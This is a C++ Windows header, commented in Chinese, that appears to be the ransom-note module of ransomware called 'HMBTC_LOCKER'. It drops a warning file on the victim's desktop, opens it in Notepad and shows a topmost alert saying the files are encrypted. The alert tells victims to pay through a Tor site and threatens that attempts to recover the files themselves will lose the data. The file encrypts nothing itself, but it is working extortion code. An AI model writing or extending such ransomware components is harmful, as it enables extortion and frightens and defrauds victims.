#pragma once
#pragma once
#include <Windows.h>
#include <shlobj.h>
#include <shellapi.h>
#include <string>

// 获取桌面路径
std::wstring GetDesktopPath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
        return std::wstring(path) + L"\\";
    }
    return L"C:\\"; // 如果失败，回退到C盘根目录
}

// ASCII艺术内容
const wchar_t* GetAsciiArt() {
    return L"\
 ▄▀▀ █▀▀ ▄▀▄ █▀▄ ██▄ █   ▄█▀█▄ █   █ ▄▀▀▄ ▄▀▀ ▄▀▄ █   \r\n\
 █▄▄ █▄▄ █▀█ █▀▄ █▄█ █▄▄ █  █  █▄▄ █ █▄▄  █▄▄ █▀█ █▄▄ \r\n\
\r\n\
██████ █████  █████ ████  █████ █████ ████  █████ ██████\r\n\
██  ██ ██  ██ ██    ██  █ ██    ██  █ ██  █   ██  ██  ██\r\n\
██  ██ ██████ ████  █████ █████ █████ █████   ██   █████\r\n\
██  ██ ██  ██ ██    ██  █ ██    ██  █ ██  █   ██   ██ ██\r\n\
██████ ██  ██ █████ ██  █ █████ ██  █ ██  █   ██  ██████\r\n\
\r\n\
===================================================================\r\n";
}

// 警告信息内容
const wchar_t* GetWarningText() {
    return L"\
  !! WARNING: YOUR FILES HAVE BEEN ENCRYPTED !!\r\n\
\r\n\
Follow these steps to get your stuff back:\r\n\
1. Go to our VPN site: ikuuu.one\r\n\
2. Grab Tor browser (official): torproject.org\r\n\
3. Hit our service site through Tor\r\n\
\r\n\
Heads up:\r\n\
- DIY recovery attempts = say bye to your data forever\r\n\
- Paying up = only legit way to get your files back\r\n\
\r\n\
===================================================================";
}
// 创建文件并写入内容
bool CreateWarningFile(const std::wstring& filePath) {
    HANDLE hFile = CreateFileW(
        filePath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    // 组合文件内容
    std::wstring content = GetAsciiArt();
    content += GetWarningText();

    // 写入内容
    DWORD bytesWritten;
    WriteFile(hFile, content.c_str(),
        static_cast<DWORD>(content.size() * sizeof(wchar_t)),
        &bytesWritten, NULL);

    CloseHandle(hFile);
    return true;
}

// 用记事本打开文件
void OpenFile(const std::wstring& filePath) {
    std::wstring command = L"notepad.exe \"" + filePath + L"\"";

    // 方法1：使用ShellExecute
    ShellExecuteW(NULL, L"open", L"notepad.exe", filePath.c_str(), NULL, SW_SHOW);

    // 方法2：使用WinExec
    WinExec(reinterpret_cast<const char*>(command.c_str()), SW_SHOW);
}

// 显示警告消息框
void ShowWarningMessage(const std::wstring& filePath) {
    std::wstring msg = L"Urgent Security Alert!\r\n\r\n";
    msg += L"Your files got locked! Recovery steps saved here:\r\n";
    msg += filePath + L"\r\n\r\n";
    msg += L"Do NOT freestyle this - follow the instructions EXACTLY or your data's toast!";

    MessageBoxW(NULL, msg.c_str(), L"File Encryption Alert",
        MB_OK | MB_ICONEXCLAMATION | MB_TOPMOST | MB_SETFOREGROUND);
}
// 主函数
int showtext() {
    // 获取桌面路径
    std::wstring desktopPath = GetDesktopPath();
    std::wstring filePath = desktopPath + L"HMBTC_LOCKER_WARNING.txt";

    // 创建文件
    if (CreateWarningFile(filePath)) {
        // 打开文件
        OpenFile(filePath);

        // 显示警告
        ShowWarningMessage(filePath);
    }
    else {
        // 文件创建失败时的消息
        std::wstring errorMsg = L"error ";
        errorMsg += std::to_wstring(GetLastError());

        MessageBoxW(NULL, errorMsg.c_str(), L"error",
            MB_OK | MB_ICONERROR);
    }

    return 0;
}